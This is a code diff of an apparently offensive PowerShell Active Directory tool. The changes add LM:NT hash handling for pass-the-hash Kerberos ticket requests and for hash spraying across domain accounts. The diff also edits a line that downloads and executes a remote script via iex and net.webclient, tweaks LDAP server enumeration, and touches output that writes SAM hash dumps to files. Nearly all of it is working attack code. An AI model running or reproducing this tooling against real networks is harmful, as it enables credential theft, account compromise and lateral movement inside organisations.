@@ -719,27 +719,39 @@ Version : 0.4.7")
                         break
                     }
                 }
-                elseif ($Hash.Length -eq 64) {
-                    klist purge | Out-Null
 
+                if ($Hash.Length -eq 65) {
+                    $colonCount = ($Hash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
+                    
+                    if ($colonCount -ne 1) {
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
+                        Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
+                        break
+                    }
+                
+                    $Hash = $Hash.Split(':')[1]
+
+                    klist purge | Out-Null
+                
                     if ($UserDomain -ne "") {
                         if ($DomainController -ne "") {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                         }
                         else {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /aes256:$Hash /opsec /force /ptt
+                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt
                         }
                     }
                     if ($UserDomain -eq "") {
                         if ($DomainController -ne "") {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /aes256:$Hash /opsec /force /ptt
+                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /dc:$DomainController /rc4:$Hash /opsec /force /ptt
                         }
                         else {
-                            $Ask256 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt
+                            $AskRC4 = Invoke-rTickets ticketreq /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt
                         }
                     }
 
-                    if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*") {
+                    if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*") {
                         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                         Write-Host "Incorrect hash or username"
                         klist purge | Out-Null
@@ -752,24 +764,12 @@ Version : 0.4.7")
                     
                         break
                     }
-
-                    if ($Ask256 -like "*Unhandled rTickets exception:*") {
-                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                        Write-Host "Incorrect hash or username"
-                        klist purge | Out-Null
-                        if ($DomainController -ne "") {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /$Domain /dc:$DomainController | Out-Null
-                        }
-                        else {
-                            Invoke-rTickets ptt /ticket:$Global:OriginalUserTicket /domain:$Domain | Out-Null
-                        }
-                    
-                        break
-                    }
                 }
+                
+
                 else {
                     Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-                    Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
+                    Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                     Write-Host 
                     Write-Host
                 
@@ -792,7 +792,7 @@ Version : 0.4.7")
                 $Global:SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
             }
         
-            $finalcommand = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Amnesiac/main/Amnesiac.ps1');Amnesiac -ScanMode -GlobalPipeName $PN"
+            $finalcommand = "iex(new-object net.webclient).downloadstring('$Amn3s1acURL');Amnesiac -ScanMode -GlobalPipeName $PN"
             $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($finalcommand))
             Invoke-Expression -Command $Global:rbs
 
@@ -1098,7 +1098,7 @@ Version : 0.4.7")
                 }
                 else {
                     Write-Verbose "Obtaining Servers (Enabled) from LDAP query"
-                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+                    $searcher.Filter = "(&(objectCategory=computer)(operatingSystem=*windows server*)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))"
                     $computers = $searcher.FindAll() | Where-Object {
                         $_.Properties["dnshostname"][0] -ne "$env:COMPUTERNAME.$env:USERDNSDOMAIN"
                     }
@@ -2272,29 +2272,29 @@ while (`$true) {
                     # [other conditions for $result]
                     if ($result -eq "Access Denied") {
                         if ($successOnly) { continue }
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!" -methodPrefix "SMB!"
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                         continue
                     } 
                     elseif ($result -eq "Unexpected Error") {
                         if ($successOnly) { continue }
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                         continue
                     } 
             
                     elseif ($result -eq "Timed Out") {
                         if ($successOnly) { continue }
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                         continue
                     }
             
                     elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                         if ($successOnly) { continue }
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                         continue
                     } 
              
                     elseif ($result -eq "Successful Connection PME") {
-                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
                     } 
             
                     elseif ($result -eq "Unable to connect") {}
@@ -2303,11 +2303,11 @@ while (`$true) {
                 
                         if ($result -eq "No Results") {
                             if ($successOnly) { continue }
-                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                         }
                  
                         else {
-                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength -methodPrefix "SMB!"
+                            Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
 
                             $filePath = switch ($Module) {
                                 "SAM" { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
@@ -3478,7 +3478,7 @@ while (`$true) {
             Write-Host "Threshold not found. Aborting..."
             return
         }
-
+        
         # gut this out and replace with the new function
         $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
 
@@ -3492,9 +3492,9 @@ while (`$true) {
             $SprayPassword = ""
             $AccountAsPassword = $False
 
-            if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64) {
+            if ($SprayHash.Length -ne 32 -and $SprayHash.Length -ne 64 -and $SprayHash.Length -ne 65) {
                 Write-Host "[-] " -ForegroundColor "Red" -NoNewline
-                Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
+                Write-Host "Supply either a 32-character RC4/NT hash, 64-character AES256 hash or a NTLM hash"
                 Write-Host 
                 return
             }
@@ -3562,6 +3562,18 @@ while (`$true) {
                 if ($SprayHash -ne "") {
                     if ($SprayHash.Length -eq 32) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String }
                     elseif ($SprayHash.Length -eq 64) { $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /aes256:$SprayHash /domain:$domain | Out-String }
+                    elseif ($SprayHash.Length -eq 65) {
+                        $colonCount = ($SprayHash.ToCharArray() | Where-Object { $_ -eq ':' }).Count
+                        if ($colonCount -ne 1) {
+                            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                            Write-Host "Ensure the provided value for the NTLM hash is formed as LM:NT"
+                            Write-Host "Example: aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe"
+                            break
+                        }
+                    
+                        $SprayHash = $SprayHash.Split(':')[1]
+                        $Attempt = Invoke-rTickets ticketreq /user:$UserToSpray /rc4:$SprayHash /domain:$domain | Out-String
+                    }
 
                     # Check for Unhandled exception
                     if ($Attempt.IndexOf("Unhandled rTickets exception:") -ne -1) {
